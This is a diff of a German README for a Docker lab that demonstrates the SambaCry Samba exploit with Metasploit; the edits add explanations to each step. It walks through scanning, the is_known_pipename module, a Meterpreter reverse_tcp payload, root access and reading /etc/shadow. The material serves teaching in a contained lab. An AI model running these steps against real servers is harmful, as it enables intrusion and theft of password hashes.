@@ -20,11 +20,11 @@ SambaCry wurde 2017 als "EternalRed" bezeichnet — die Linux-Variante von Etern
 ## Start
 
 ```sh
-docker compose up -d
-docker attach msf-attacker
+docker compose up -d        # beide Container im Hintergrund starten
+docker attach msf-attacker  # an die laufende msfconsole hängen
 ```
 
-`docker attach` hängt sich an die laufende `msfconsole`. Mit `Ctrl-P Ctrl-Q` wieder ablösen, ohne sie zu killen.
+`Ctrl-P Ctrl-Q` löst wieder ab, ohne die Konsole zu killen.
 
 ## Demo-Ablauf
 
@@ -36,7 +36,7 @@ In der `msfconsole`:
 db_nmap -sV 10.10.0.20
 ```
 
-→ Port 139/445 offen, Service `Samba smbd`.
+`db_nmap` ist nmap, integriert in Metasploit — Ergebnisse landen direkt in der internen DB. `-sV` macht Service-/Versions-Erkennung. Wir sehen: Port 139 + 445 offen, Service `Samba smbd`.
 
 ### 2. Schwachstelle prüfen
 
@@ -45,6 +45,10 @@ use exploit/linux/samba/is_known_pipename
 set RHOSTS 10.10.0.20
 check
 ```
+
+- `use ...` lädt das Exploit-Modul für SambaCry.
+- `set RHOSTS` legt das Ziel fest (Remote Host).
+- `check` testet **ohne anzugreifen**, ob das Ziel verwundbar aussieht.
 
 → `The target appears to be vulnerable.`
 
@@ -59,6 +63,12 @@ set SMB_FOLDER /tmp
 run
 ```
 
+- `target 3` = Linux x86_64. Das ist die Architektur, die das Victim-Image fährt.
+- `PAYLOAD ... reverse_tcp` = der Code, der auf dem Opfer ausgeführt wird. Meterpreter ist Metasploits feature-reicher Agent. **Reverse** = das Opfer baut die Verbindung zu uns auf (umgeht Firewalls leichter als ein Bind-Shell).
+- `LHOST` = unsere IP, an die das Opfer zurückverbinden soll.
+- `SMB_SHARE_NAME` / `SMB_FOLDER` = der schreibbare Share, in den der Exploit seine Schad-`.so` hochlädt, bevor Samba sie als Bibliothek lädt. Hier explizit gesetzt, weil das Auto-Detect-Verhalten nicht 100% deterministisch ist.
+- `run` startet den Angriff.
+
 → Meterpreter-Session als **root**.
 
 ### 4. Post-Exploitation
@@ -66,24 +76,24 @@ run
 In der Meterpreter-Session:
 
 ```
-getuid          # uid=0 root
-sysinfo         # OS, hostname, architecture
-shell           # echte Shell auf dem Opfer
+getuid          # zeigt: uid=0 root — wir sind root auf dem Opfer
+sysinfo         # OS, Hostname, Architektur
+shell           # in eine echte Shell auf dem Opfer wechseln
 ```
 
 In der Shell:
 
 ```sh
-cat /etc/shadow
-ls /root
+cat /etc/shadow  # Passwort-Hashes — der "Beweis", dass wir wirklich root sind
+ls /root         # ins Home-Verzeichnis von root schauen
 ```
 
-Mit `exit` zurück in die Meterpreter, mit `background` zurück in `msfconsole`.
+Mit `exit` zurück in den Meterpreter, mit `background` zurück in die `msfconsole`.
 
 ## Stop
 
 ```sh
-docker compose down
+docker compose down  # stoppt und entfernt beide Container
 ```
 
 ## Hinweise
